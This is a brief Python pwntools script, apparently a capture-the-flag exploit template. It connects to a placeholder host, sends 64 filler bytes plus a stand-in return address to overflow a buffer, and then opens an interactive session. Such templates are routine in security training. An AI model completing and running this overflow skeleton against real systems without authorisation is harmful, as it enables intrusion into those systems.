#!/usr/bin/env python3
from pwn import *

# Define variables for the target binary and remote server
host = 'ip'
port = 1337

executable = './vulnerable_binary'


def exploit():
    p = remote(host, port)  # Connect to the remote server
    # p = process(executable)  # Run the binary

    p.recvuntil('')

    payload = b'A' * 64  # Example payload
    payload += p64(0xaaaaaaaa)

    # Send the payload
    p.sendline(payload)

    # Interact with the process
    p.interactive()


# auto run the exploit function
if __name__ == '__main__':
    exploit()
